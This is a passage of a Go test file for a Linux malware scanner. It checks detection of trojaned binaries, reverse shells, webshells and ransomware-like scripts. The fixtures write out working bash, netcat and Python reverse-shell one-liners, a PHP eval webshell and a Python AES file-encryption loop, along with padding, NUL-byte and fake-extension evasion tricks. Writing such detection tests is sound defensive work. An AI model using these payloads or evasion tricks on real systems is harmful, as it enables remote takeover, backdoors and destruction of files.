	mShell := scanner.CheckSuspiciousScriptContent(benignShellPath, benignShellContent, mockDB, cfg)
	if mShell != nil {
		t.Errorf("expected nil for benign package admin script, got: %+v", mShell)
	}
}

func TestCheckTrojanedPackageBinary(t *testing.T) {
	cfg := config.NewDefaultConfig()

	mockDB := &mockTestPkgDB{
		owned: map[string]string{
			"/usr/bin/ls":         "coreutils",
			"/bin/cat":            "coreutils",
			"/usr/sbin/ip":        "iproute2",
			"/boot/vmlinuz-6.8.0": "linux-image-6.8.0",
		},
		digests: map[string]string{
			"/usr/bin/ls":         "d41d8cd98f00b204e9800998ecf8427e",
			"/bin/cat":            "0123456789abcdef0123456789abcdef",
			"/usr/sbin/ip":        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
			"/boot/vmlinuz-6.8.0": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
		},
	}

	// 1. Exact matching digest -> nil (clean)
	mMatch := scanner.CheckTrojanedPackageBinary("/usr/bin/ls", "d41d8cd98f00b204e9800998ecf8427e", mockDB, cfg)
	if mMatch != nil {
		t.Errorf("expected nil for matching binary checksum, got: %+v", mMatch)
	}

	// 2. Mismatching digest on standard system binary -> ALERT (score 95)
	mMismatch := scanner.CheckTrojanedPackageBinary("/usr/bin/ls", "ffffffffffffffffffffffffffffffff", mockDB, cfg)
	if mMismatch == nil {
		t.Fatalf("expected heuristic match for trojaned system binary, got nil")
	}
	if mMismatch.Name != "Trojaned_Package_Binary_Modified" || mMismatch.Severity != report.SeverityAlert || mMismatch.Score != 95 {
		t.Errorf("expected Trojaned_Package_Binary_Modified ALERT (95), got: %+v", mMismatch)
	}

	// 3. Binary not in standard system directory -> nil (skipped)
	mNonSys := scanner.CheckTrojanedPackageBinary("/opt/custom/tool", "ffffffffffffffffffffffffffffffff", mockDB, cfg)
	if mNonSys != nil {
		t.Errorf("expected nil for non-system path, got: %+v", mNonSys)
	}

	// 4. File in system dir with no package DB digest recorded -> nil (skipped)
	mNoDigest := scanner.CheckTrojanedPackageBinary("/usr/bin/unrecorded", "ffffffffffffffffffffffffffffffff", mockDB, cfg)
	if mNoDigest != nil {
		t.Errorf("expected nil for unrecorded binary, got: %+v", mNoDigest)
	}

	// 5. Nil pkgDB -> nil
	mNilDB := scanner.CheckTrojanedPackageBinary("/usr/bin/ls", "ffffffffffffffffffffffffffffffff", nil, cfg)
	if mNilDB != nil {
		t.Errorf("expected nil for nil pkgDB, got: %+v", mNilDB)
	}

	// 6. Kernel/initramfs trees under /boot are now in scope: a mismatched
	// digest must alert, a matching one must stay silent.
	mBootMismatch := scanner.CheckTrojanedPackageBinary("/boot/vmlinuz-6.8.0", "ffffffffffffffffffffffffffffffff", mockDB, cfg)
	if mBootMismatch == nil {
		t.Fatal("expected detection for trojaned kernel image under /boot")
	}
	if mBootMismatch.Severity != report.SeverityAlert {
		t.Errorf("expected ALERT for /boot kernel mismatch, got %s", mBootMismatch.Severity)
	}
	mBootMatch := scanner.CheckTrojanedPackageBinary("/boot/vmlinuz-6.8.0", "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", mockDB, cfg)
	if mBootMatch != nil {
		t.Errorf("expected nil for matching kernel image, got: %+v", mBootMatch)
	}
}

func TestCheckAllSuspiciousScriptContent_MultipleMatches(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// A multi-stage threat containing both an interactive reverse shell and ransomware encryption
	multiThreatPayload := []byte(`#!/bin/bash
# Stage 1: Call back home
bash -i >& /dev/tcp/198.51.100.1/4444 0>&1

# Stage 2: Encrypt victim files
python3 -c "
import os
from Crypto.Cipher import AES
for root, dirs, files in os.walk('/home'):
    for f in files:
        cipher = AES.new(b'0123456789abcdef', AES.MODE_CBC)
        with open(os.path.join(root, f) + '.locked', 'wb') as out:
            out.write(cipher.encrypt(b'victim data...'))
"
`)

	matches := scanner.CheckAllSuspiciousScriptContent("/tmp/multi_implant.sh", multiThreatPayload, nil, cfg)
	if len(matches) < 2 {
		t.Fatalf("expected at least 2 distinct heuristic matches, got %d", len(matches))
	}

	foundRevShell := false
	foundRansomware := false
	for _, m := range matches {
		if m.Name == "Script_Reverse_Shell_Interactive" {
			foundRevShell = true
		}
		if m.Name == "Script_Python_Ransomware_Encryptor" {
			foundRansomware = true
		}
	}

	if !foundRevShell {
		t.Errorf("expected Script_Reverse_Shell_Interactive among matches")
	}
	if !foundRansomware {
		t.Errorf("expected Script_Python_Ransomware_Encryptor among matches")
	}

	// Single-match backward-compatible wrapper should return the highest severity/score match
	single := scanner.CheckSuspiciousScriptContent("/tmp/multi_implant.sh", multiThreatPayload, nil, cfg)
	if single == nil {
		t.Fatalf("expected non-nil from CheckSuspiciousScriptContent")
	}
	if single.Score < 90 {
		t.Errorf("expected top score >= 90, got %d", single.Score)
	}
}

func TestCheckSuspiciousScriptContent_DualWindowTailEvasion(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// Construct a 2.5MB script where the first 2.1MB is benign comment padding,
	// and the tail contains an interactive reverse shell.
	headPadding := strings.Repeat("# harmless comment padding for testing evasion\n", 45000) // ~2.1MB
	tailPayload := "\nbash -i >& /dev/tcp/10.10.14.5/4444 0>&1\n"
	fullData := []byte(headPadding + tailPayload)

	if len(fullData) <= 2*1024*1024 {
		t.Fatalf("expected payload > 2MB for dual-window evasion test, got %d bytes", len(fullData))
	}

	matches := scanner.CheckAllSuspiciousScriptContent("/tmp/padded_implant.sh", fullData, nil, cfg)
	if len(matches) == 0 {
		t.Fatalf("expected dual-window scanner to detect tail payload in 2.5MB script, got 0 matches")
	}

	found := false
	for _, m := range matches {
		if m.Name == "Script_Reverse_Shell_Interactive" {
			found = true
			if !m.Truncated {
				t.Errorf("expected Truncated flag to be true for >2MB script")
			}
		}
	}
	if !found {
		t.Errorf("expected Script_Reverse_Shell_Interactive to be detected in tail window")
	}

	// Verify single-return wrapper also catches it and preserves Truncated flag
	single := scanner.CheckSuspiciousScriptContent("/tmp/padded_implant.sh", fullData, nil, cfg)
	if single == nil || !single.Truncated {
		t.Errorf("expected single wrapper to return truncated match, got: %+v", single)
	}
}

func TestCheckSuspiciousScriptContent_MiddleOfFileEvasion(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// Construct a 5MB script with reverse shell planted at offset 2.5MB (dead center)
	headPadding := bytes.Repeat([]byte("# benign system administration shell configuration parameter\n"), 40000) // ~2.4MB
	payload := []byte("nc -e /bin/bash 192.168.1.100 4444\n")
	tailPadding := bytes.Repeat([]byte("# trailing benign application parameters and comments\n"), 45000) // ~2.5MB

	fullData := make([]byte, 0, len(headPadding)+len(payload)+len(tailPadding))
	fullData = append(fullData, headPadding...)
	fullData = append(fullData, payload...)
	fullData = append(fullData, tailPadding...)

	if len(fullData) < 4*1024*1024 {
		t.Fatalf("expected payload > 4MB for middle-of-file evasion test, got %d bytes", len(fullData))
	}

	// Payload is strictly outside the first 1MB and last 1MB
	payloadOffset := len(headPadding)
	if payloadOffset < 1024*1024 || (len(fullData)-payloadOffset) < 1024*1024 {
		t.Fatalf("payload is not in the middle beyond 1MB head/tail windows")
	}

	matches := scanner.CheckAllSuspiciousScriptContent("/tmp/middle_payload.sh", fullData, nil, cfg)
	if len(matches) == 0 {
		t.Fatalf("expected sliding overlapping chunk scanner to detect middle-of-file payload, got 0 matches")
	}

	found := false
	for _, m := range matches {
		if m.Name == "Script_Netcat_Reverse_Shell" {
			found = true
			if !m.Truncated {
				t.Errorf("expected Truncated flag to be true for >2MB script")
			}
		}
	}
	if !found {
		t.Errorf("expected Script_Netcat_Reverse_Shell to be detected in sliding middle window, got: %v", matches)
	}

	single := scanner.CheckSuspiciousScriptContent("/tmp/middle_payload.sh", fullData, nil, cfg)
	if single == nil || single.Name != "Script_Netcat_Reverse_Shell" {
		t.Errorf("expected single wrapper to find Script_Netcat_Reverse_Shell, got: %+v", single)
	}
}

func TestCheckAllSuspiciousScriptContent_BinaryExtensionEvasion(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// 1. Shebang-less reverse shell named .bin in /tmp
	binPayload := []byte("/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
	matches := scanner.CheckAllSuspiciousScriptContent("/tmp/payload.bin", binPayload, nil, cfg)
	if len(matches) == 0 {
		t.Fatalf("expected payload.bin to be detected, got 0 matches")
	}
	if matches[0].Name != "Script_Reverse_Shell_Interactive" {
		t.Errorf("expected Script_Reverse_Shell_Interactive, got %s", matches[0].Name)
	}

	// 2. Shebang-less PHP webshell named .dat in /var/www/html
	phpPayload := []byte("<?php eval($_POST['cmd']); ?>\n")
	phpMatches := scanner.CheckAllSuspiciousScriptContent("/var/www/html/include.dat", phpPayload, nil, cfg)
	if len(phpMatches) == 0 {
		t.Fatalf("expected include.dat to be detected, got 0 matches")
	}
	foundWebshell := false
	for _, m := range phpMatches {
		if m.Name == "Webshell_PHP_Generic_Backdoor" {
			foundWebshell = true
			break
		}
	}
	if !foundWebshell {
		t.Errorf("expected Webshell_PHP_Generic_Backdoor, got %v", phpMatches)
	}

	// 3. Shebang-less inline reverse shell named .so in /dev/shm
	pyPayload := []byte("import socket,os,subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('10.0.0.1',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])\n")
	soMatches := scanner.CheckAllSuspiciousScriptContent("/dev/shm/module.so", pyPayload, nil, cfg)
	if len(soMatches) == 0 {
		t.Fatalf("expected module.so (non-ELF) to be detected, got 0 matches")
	}
	if soMatches[0].Name != "Script_Reverse_Shell_Inline" {
		t.Errorf("expected Script_Reverse_Shell_Inline, got %s", soMatches[0].Name)
	}
}

func TestCheckAllSuspiciousScriptContent_EarlyNULByteEvasion(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// Attacker prepends a single null byte to evade traditional git/POSIX 512-byte text check
	nulPayload := append([]byte{0x00}, []byte("/bin/bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")...)
	matches := scanner.CheckAllSuspiciousScriptContent("/tmp/evasion.sh", nulPayload, nil, cfg)
	if len(matches) == 0 {
		t.Fatalf("expected early NUL byte script to be detected, got 0 matches")
	}
	if matches[0].Name != "Script_Reverse_Shell_Interactive" {
		t.Errorf("expected Script_Reverse_Shell_Interactive, got %s", matches[0].Name)
	}
}

func TestCheckAllSuspiciousScriptContent_BenignBinaryNoFalsePositive(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// Benign binary buffer containing null bytes, high entropy bytes, and no attack primitives
	benignData := make([]byte, 8192)
	for i := range benignData {
		benignData[i] = byte(i % 256)
	}

	matchesBin := scanner.CheckAllSuspiciousScriptContent("/tmp/firmware.bin", benignData, nil, cfg)
	if len(matchesBin) != 0 {
		t.Errorf("expected 0 matches for benign binary firmware.bin, got %d matches", len(matchesBin))
	}

	matchesDat := scanner.CheckAllSuspiciousScriptContent("/var/www/cache.dat", benignData, nil, cfg)
	if len(matchesDat) != 0 {
		t.Errorf("expected 0 matches for benign cache.dat, got %d matches", len(matchesDat))
	}
}

func TestCheckAllSuspiciousScriptContent_ShebanglessPythonReverseShell(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// Shebang-less Python reverse shell in a non-volatile user directory (/home/nick/tool.py or /home/nick/exploit.txt)
	// Must be detected via text-likeness ratio without needing a shebang or volatile path prefix.
	pyPayload := []byte("import socket, os, pty\n" +
		"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" +
		"s.connect(('10.10.10.10', 9001))\n" +
		"os.dup2(s.fileno(), 0)\n" +
		"os.dup2(s.fileno(), 1)\n" +
		"os.dup2(s.fileno(), 2)\n" +
		"pty.spawn('/bin/sh')\n")

	for _, path := range []string{"/home/nick/tool.py", "/home/nick/exploit.txt", "/opt/app/worker.py"} {
		matches := scanner.CheckAllSuspiciousScriptContent(path, pyPayload, nil, cfg)
		if len(matches) == 0 {
			t.Fatalf("expected shebang-less python script at %s to be detected, got 0 matches", path)
		}
		if matches[0].Name != "Script_Reverse_Shell_Inline" {
			t.Errorf("path %s: expected Script_Reverse_Shell_Inline, got %s", path, matches[0].Name)
		}
	}
}

func TestCheckAllSuspiciousScriptContent_MediaCorpusNoFalseTriggers(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// Simulate 4MB compressed media buffers (JPEGs, ZIPs, MP3s) with random high-entropy bytes.
	// Even if benign 3-4 byte substrings like "nc ", "wso", "c99", "r57" appear by chance,
	// context gating (outside volatile paths) and text-likeness ratio (<85% printable) must
	// guarantee zero false positive candidate triggers.
	rng := rand.New(rand.NewSource(42))
	mediaBuf := make([]byte, 4*1024*1024)
	rng.Read(mediaBuf)

	// Embed collision tokens that used to cause 20% fallthrough on old token prefilters
	copy(mediaBuf[100:103], []byte("nc "))
	copy(mediaBuf[200:203], []byte("wso"))
	copy(mediaBuf[300:303], []byte("c99"))
	copy(mediaBuf[400:403], []byte("r57"))

	testPaths := []string{
		"/home/user/Pictures/vacation.jpg",
		"/home/user/Downloads/archive.zip",
		"/home/user/Music/track.mp3",
		"/tmp/backup.zip", // volatile path, but low text-likeness and no 8-byte attack tokens
	}

	for _, path := range testPaths {
		matches := scanner.CheckAllSuspiciousScriptContent(path, mediaBuf, nil, cfg)
		if len(matches) != 0 {
			t.Errorf("expected 0 matches for media file %s, got %d matches: %+v", path, len(matches), matches)
		}
	}
}

func BenchmarkScanMediaAssets_NoFalseTriggers(b *testing.B) {
	cfg := config.NewDefaultConfig()
	mediaBuf := make([]byte, 4*1024*1024)
	for i := range mediaBuf {
		mediaBuf[i] = byte(i * 31 % 256)
	}
	path := "/home/user/Pictures/large_photo.jpg"

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		matches := scanner.CheckAllSuspiciousScriptContent(path, mediaBuf, nil, cfg)
		if len(matches) != 0 {
			b.Fatalf("unexpected match in benchmark: %+v", matches)
		}
	}
}

func TestCheckAllSuspiciousScriptContent_NULPaddingExecutableBypass(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// Construct a script with 30% NUL-byte padding to drop printable ASCII well below the 85% threshold.
	// Attackers pad scripts with NUL bytes because shells strip NULs during parsing.
	baseScript := []byte("exec 5<>/dev/tcp/10.10.10.10/4444 && cat <&5 | while read line; do $line 2>&5 >&5; done\n")
	nulPadding := make([]byte, len(baseScript)/2) // ~33% NUL padding
	paddedPayload := append(baseScript, nulPadding...)

	paths := []string{
		"/usr/local/bin/run.sh",
		"/opt/custom/agent.sh",
		"/home/victim/.local/bin/runner",
	}

	for _, p := range paths {
		// When mode is executable (0755), presence of script attack tokens must force inspection
		// closing the NUL-padding evasion bypass.
		matches := scanner.CheckAllSuspiciousScriptContent(p, paddedPayload, nil, cfg, os.FileMode(0755))
		if len(matches) == 0 {
			t.Fatalf("expected executable NUL-padded script at %s to be flagged, got 0 matches", p)
		}
		found := false
		for _, m := range matches {
			if m.Name == "Script_Reverse_Shell_Interactive" {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected Script_Reverse_Shell_Interactive in matches, got: %+v", matches)
		}
	}

	// Verify that a non-executable file (0644) without valid text ratio is not inspected if outside volatile/web paths
	nonExecBuf := make([]byte, 1024)
	copy(nonExecBuf, []byte("some arbitrary text")) // <85% printable because rest is NULs
	matches := scanner.CheckAllSuspiciousScriptContent("/opt/custom/data.bin", nonExecBuf, nil, cfg, os.FileMode(0644))
	if len(matches) != 0 {
		t.Errorf("expected 0 matches for non-executable padded data, got %d", len(matches))
	}
}

func TestCheckAllSuspiciousScriptContent_ConfigAndLocalContextGating(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// Embedded payload with attack token inside ~/.config and ~/.local paths
	payload := []byte("#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.1.50/8080 0>&1\n")

	testPaths := []string{
		"/home/user/.config/autostart/login.desktop",
		"/home/user/.local/share/systemd/user/backdoor.sh",
		"/root/.config/startup.sh",
		"/opt/vendor/libexec/monitor.sh",
		"/usr/local/etc/hook.sh",
	}

	for _, p := range testPaths {
		matches := scanner.CheckAllSuspiciousScriptContent(p, payload, nil, cfg, os.FileMode(0755))
		if len(matches) == 0 {
			t.Fatalf("expected detection in user-config / opt path %s, got 0 matches", p)
		}
		if matches[0].Name != "Script_Reverse_Shell_Interactive" {
			t.Errorf("path %s: expected Script_Reverse_Shell_Interactive, got %s", p, matches[0].Name)
		}
	}
}
